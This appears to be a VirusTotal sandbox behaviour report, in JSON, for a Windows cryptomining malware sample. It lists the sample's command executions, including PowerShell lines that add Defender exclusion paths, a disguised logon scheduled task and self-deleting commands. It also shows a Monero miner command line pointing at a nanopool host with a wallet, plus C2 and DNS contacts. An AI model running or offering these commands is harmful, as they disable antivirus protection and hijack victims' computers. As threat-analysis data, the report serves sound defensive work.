@@ -1,0 +1,383 @@
+{
+  "attributes": {
+    "command_executions": [
+      "\"%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe\" ",
+      "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%%UserProfile%%' & powershell -Command Add-MpPreference -ExclusionPath '%%AppData%%' & powershell -Command Add-MpPreference -ExclusionPath '%%Temp%%' & powershell -Command Add-MpPreference -ExclusionPath '%%SystemRoot%%' & exit",
+      "powershell  -Command Add-MpPreference -ExclusionPath '%USERPROFILE% ",
+      "powershell  -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming' ",
+      "powershell  -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Local\\Temp' ",
+      "powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Windows' ",
+      "\"C:\\Windows\\System32\\cmd.exe\" /c %USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe \"%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe\"",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe  \"%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe\"",
+      "\"C:\\Windows\\System32\\cmd.exe\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"C:\\Windows\\system32\\services64.exe\"' & exit",
+      "schtasks  /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"C:\\Windows\\system32\\services64.exe\"' ",
+      "\"C:\\Windows\\system32\\services64.exe\" ",
+      "\"C:\\Windows\\System32\\cmd.exe\" /C choice /C Y /N /D Y /T 3 & Del \"%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe\"",
+      "choice  /C Y /N /D Y /T 3 ",
+      "\"C:\\Windows\\System32\\cmd.exe\" /c %USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe \"C:\\Windows\\system32\\services64.exe\"",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe  \"C:\\Windows\\system32\\services64.exe\"",
+      "\"C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.exe\" ",
+      "C:\\Windows\\explorer.exe  --cinit-find-x -B --algo=\"rx/0\" --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --url=xmr-eu1.nanopool.org:14433 --user=432nnXcxVAeRoC4NXAjsEcb2wBfdzJyv4dako7sUvUuN1wtr3t94FD4FJq9qpLRVkfaPEjMYiPnHa85WE38RxaFA8opkGCA.{COMPUTERNAME}/bobisoffline123@gmail.com --pass= --cpu-max-threads-hint=40  --cinit-stealth-targets=\"+iU/trnPCTLD3p+slbva5u4EYOS6bvIPemCHGQx2WRUcnFdomWh6dhl5H5KbQCjp6yCYlsFu5LR1mi7nQAy56B+5doUwurAPvCael2sR/N4=\"  --tls  --cinit-stealth "
+    ],
+    "registry_keys_set": [
+      {
+        "key": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\Start",
+        "value": "DWORD (0x00000003)"
+      },
+      {
+        "key": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\ImagePath",
+        "value": "\\??\\%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Libs\\WR64.sys"
+      },
+      {
+        "key": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\Start",
+        "value": "DWORD (0x00000004)"
+      }
+    ],
+    "has_evtx": false,
+    "ip_traffic": [
+      {
+        "transport_layer_protocol": "TCP",
+        "destination_ip": "185.65.135.234",
+        "destination_port": 58899
+      },
+      {
+        "transport_layer_protocol": "TCP",
+        "destination_ip": "13.107.4.50",
+        "destination_port": 80
+      },
+      {
+        "transport_layer_protocol": "TCP",
+        "destination_ip": "104.192.141.1",
+        "destination_port": 443
+      },
+      {
+        "transport_layer_protocol": "TCP",
+        "destination_ip": "51.255.34.118",
+        "destination_port": 14433
+      }
+    ],
+    "processes_injected": [
+      "C:\\Windows\\explorer.exe"
+    ],
+    "modules_loaded": [
+      "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+      "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\999d72a4e033bba86d05407570c67cba\\System.Management.Automation.ni.dll",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+      "C:\\Windows\\System32\\wbem\\wmiutils.dll"
+    ],
+    "has_pcap": false,
+    "analysis_date": 1633393161,
+    "sandbox_name": "Microsoft Sysinternals",
+    "has_html_report": false,
+    "processes_terminated": [
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "C:\\Windows\\System32\\cmd.exe",
+      "C:\\Windows\\System32\\conhost.exe",
+      "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+      "C:\\Windows\\System32\\schtasks.exe",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+      "C:\\Windows\\System32\\choice.exe",
+      "C:\\Windows\\System32\\services64.exe"
+    ],
+    "behash": "d20ecebc6540c2fba3024941a3a0070d",
+    "files_deleted": [
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_szru5clb.hz1.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uziie1be.o3w.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bxbbqyn1.42q.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zd5wo1bl.0s4.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1cnfgxx4.j3z.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vxbypyzm.i0l.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ptqjarqv.vxa.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0u55w3yq.ahp.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_impxnvm2.iu4.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cmb001lx.5jn.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1w5qmr2u.zhw.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ofm3i11t.j3o.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_duzasj3i.aja.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_iuhb3i03.hko.psm1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_acgbo4m5.cgl.ps1",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tb1memd2.3ud.psm1"
+    ],
+    "files_dropped": [
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_szru5clb.hz1.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uziie1be.o3w.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bxbbqyn1.42q.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zd5wo1bl.0s4.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1cnfgxx4.j3z.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vxbypyzm.i0l.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ptqjarqv.vxa.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0u55w3yq.ahp.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe.log"
+      },
+      {
+        "path": "C:\\Windows\\System32\\services64.exe"
+      },
+      {
+        "path": "C:\\Windows\\System32\\Tasks\\services64"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\svchost64.exe.log"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_impxnvm2.iu4.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cmb001lx.5jn.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1w5qmr2u.zhw.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ofm3i11t.j3o.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_duzasj3i.aja.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_iuhb3i03.hko.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_acgbo4m5.cgl.ps1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tb1memd2.3ud.psm1"
+      },
+      {
+        "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\services64.exe.log"
+      },
+      {
+        "path": "C:\\Windows\\System32\\Microsoft\\Libs"
+      },
+      {
+        "path": "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.exe"
+      },
+      {
+        "path": "C:\\Windows\\System32\\Microsoft\\Libs\\WR64.sys"
+      },
+      {
+        "path": "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.log"
+      }
+    ],
+    "dns_lookups": [
+      {
+        "resolved_ips": [
+          "185.65.135.234"
+        ],
+        "hostname": "sanctam.net"
+      },
+      {
+        "resolved_ips": [
+          "104.192.141.1"
+        ],
+        "hostname": "bitbucket.org"
+      },
+      {
+        "resolved_ips": [
+          "135.125.238.108",
+          "51.255.34.118",
+          "51.15.54.102",
+          "185.71.66.31",
+          "51.15.58.224",
+          "46.105.31.147",
+          "51.15.78.68",
+          "51.68.143.81",
+          "217.182.169.148",
+          "51.83.33.228",
+          "51.15.65.182",
+          "51.15.69.136"
+        ],
+        "hostname": "xmr-eu1.nanopool.org"
+      }
+    ],
+    "last_modification_date": 1633393161,
+    "has_memdump": false,
+    "processes_created": [
+      "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+      "C:\\Windows\\System32\\cmd.exe",
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+      "C:\\Windows\\System32\\schtasks.exe",
+      "C:\\Windows\\System32\\services64.exe",
+      "C:\\Windows\\System32\\choice.exe",
+      "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.exe",
+      "C:\\Windows\\explorer.exe"
+    ],
+    "processes_tree": [
+      {
+        "process_id": "3308",
+        "name": "%WINDIR%\\explorer.exe",
+        "children": [
+          {
+            "process_id": "3616",
+            "name": "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+            "children": [
+              {
+                "process_id": "2624",
+                "name": "C:\\Windows\\System32\\cmd.exe",
+                "children": [
+                  {
+                    "process_id": "1992",
+                    "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                  },
+                  {
+                    "process_id": "3016",
+                    "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                  },
+                  {
+                    "process_id": "2112",
+                    "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                  },
+                  {
+                    "process_id": "2464",
+                    "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                  }
+                ]
+              },
+              {
+                "process_id": "836",
+                "name": "C:\\Windows\\System32\\cmd.exe",
+                "children": [
+                  {
+                    "process_id": "4076",
+                    "name": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+                    "children": [
+                      {
+                        "process_id": "2044",
+                        "name": "C:\\Windows\\System32\\cmd.exe",
+                        "children": [
+                          {
+                            "process_id": "3552",
+                            "name": "C:\\Windows\\System32\\schtasks.exe"
+                          }
+                        ]
+                      },
+                      {
+                        "process_id": "1812",
+                        "name": "C:\\Windows\\System32\\services64.exe",
+                        "children": [
+                          {
+                            "process_id": "3504",
+                            "name": "C:\\Windows\\System32\\cmd.exe",
+                            "children": [
+                              {
+                                "process_id": "1692",
+                                "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                              },
+                              {
+                                "process_id": "3752",
+                                "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                              },
+                              {
+                                "process_id": "2828",
+                                "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                              },
+                              {
+                                "process_id": "2508",
+                                "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                              }
+                            ]
+                          },
+                          {
+                            "process_id": "1500",
+                            "name": "C:\\Windows\\System32\\cmd.exe",
+                            "children": [
+                              {
+                                "process_id": "3328",
+                                "name": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+                                "children": [
+                                  {
+                                    "process_id": "1368",
+                                    "name": "C:\\Windows\\System32\\cmd.exe",
+                                    "children": [
+                                      {
+                                        "process_id": "3808",
+                                        "name": "C:\\Windows\\System32\\schtasks.exe"
+                                      }
+                                    ]
+                                  },
+                                  {
+                                    "process_id": "1232",
+                                    "name": "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.exe"
+                                  },
+                                  {
+                                    "process_id": "3496",
+                                    "name": "C:\\Windows\\explorer.exe"
+                                  },
+                                  {
+                                    "process_id": "688",
+                                    "name": "C:\\Windows\\System32\\cmd.exe",
+                                    "children": [
+                                      {
+                                        "process_id": "2108",
+                                        "name": "C:\\Windows\\System32\\choice.exe"
+                                      }
+                                    ]
+                                  }
+                                ]
+                              }
+                            ]
+                          }
+                        ]
+                      },
+                      {
+                        "process_id": "3728",
+                        "name": "C:\\Windows\\System32\\cmd.exe",
+                        "children": [
+                          {
+                            "process_id": "3136",
+                            "name": "C:\\Windows\\System32\\choice.exe"
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "files_opened": [
+      "<Anonymous Pipe>",
+      "\\PSHost.132777415785472896.1992.DefaultAppDomain.powershell",
+      "\\PSHost.132777415837521828.3016.DefaultAppDomain.powershell",
+      "\\PSHost.132777415851398394.2112.DefaultAppDomain.powershell",
+      "\\PSHost.132777415864769081.2464.DefaultAppDomain.powershell",
+      "\\PSHost.132777415972973135.1692.DefaultAppDomain.powershell",
+      "\\PSHost.132777415989514431.3752.DefaultAppDomain.powershell",
+      "\\PSHost.132777416005653790.2828.DefaultAppDomain.powershell",
+      "\\PSHost.132777416019138289.2508.DefaultAppDomain.powershell"
+    ]
+  },
+  "type": "file_behaviour",
+  "id": "03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b_Microsoft Sysinternals",
+  "links": {
+    "self": "https://www.virustotal.com/api/v3/file_behaviours/03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b_Microsoft Sysinternals"
+  }
+}
